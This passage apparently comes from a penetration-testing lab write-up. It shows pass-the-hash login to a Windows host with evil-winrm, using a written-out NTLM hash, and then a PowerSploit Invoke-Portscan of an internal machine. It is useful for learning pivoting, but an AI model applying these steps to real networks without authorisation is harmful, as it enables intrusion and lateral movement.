First we need to scan for open ports on the Personal PC but as the Git-Server is a windows machine, `Nmap` won’t work.


For windows there’s a powershell script from `PowerSploit` called `Portscan.ps1` that we can use.

we will use the `Script Loader feature from evil-winrm` . (Because trying to upload the script by itself and sourcing it to the memory didn’t work.)


To do that, first we need to change our evil-winrm command a bit and put the directory path where the powershell script is located.



┌──(kali㉿kali)-[~]
└─$ `locate Portscan.ps1` 
/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/Invoke-Portscan.ps1
/usr/share/windows-resources/powersploit/Recon/Invoke-Portscan.ps1
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ `evil-winrm -u Administrator -H '37db630168e5f82aafa8461e05c6bbd1' -i 10.200.141.150 -s /usr/share/windows-resources/powersploit/Recon/`

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint


*Evil-WinRM* PS C:\Users\Administrator\Documents> `Invoke-Portscan.ps1`
*Evil-WinRM* PS C:\Users\Administrator\Documents> `Get-Help `Invoke-Portscan

NAME
    Invoke-Portscan

SYNOPSIS
    Simple portscan module

    PowerSploit Function: Invoke-Portscan
    Author: Rich Lundeen (http://webstersProdigy.net)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None


SYNTAX
    Invoke-Portscan -Hosts <String[]> [-ExcludeHosts <String>] [-Ports <String>] [-PortFile <String>] [-TopPorts <String>] [-ExcludedPorts <String>] [-SkipDiscovery] [-PingOnly] [-DiscoveryPorts <String>] [-Threads <Int32>] [-nHosts <Int32>]
    [-Timeout <Int32>] [-SleepTimer <Int32>] [-SyncFreq <Int32>] [-T <Int32>] [-GrepOut <String>] [-XmlOut <String>] [-ReadableOut <String>] [-AllformatsOut <String>] [-noProgressMeter] [-quiet] [-ForceOverwrite] [<CommonParameters>]

    Invoke-Portscan -HostFile <String> [-ExcludeHosts <String>] [-Ports <String>] [-PortFile <String>] [-TopPorts <String>] [-ExcludedPorts <String>] [-SkipDiscovery] [-PingOnly] [-DiscoveryPorts <String>] [-Threads <Int32>] [-nHosts <Int32>]
    [-Timeout <Int32>] [-SleepTimer <Int32>] [-SyncFreq <Int32>] [-T <Int32>] [-GrepOut <String>] [-XmlOut <String>] [-ReadableOut <String>] [-AllformatsOut <String>] [-noProgressMeter] [-quiet] [-ForceOverwrite] [<CommonParameters>]


DESCRIPTION
    Does a simple port scan using regular sockets, based (pretty) loosely on nmap


RELATED LINKS
    http://webstersprodigy.net

REMARKS
    To see the examples, type: "get-help Invoke-Portscan -examples".
    For more information, type: "get-help Invoke-Portscan -detailed".
    For technical information, type: "get-help Invoke-Portscan -full".
    For online help, type: "get-help Invoke-Portscan -online"


*Evil-WinRM* PS C:\Users\Administrator\Documents> `Invoke-Portscan -Hosts 10.200.141.100 -TopPorts 50 -T 4 -oA PersonalPC`


Hostname      : 10.200.141.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 79, 88...}
finishTime    : 4/14/2024 5:10:35 AM



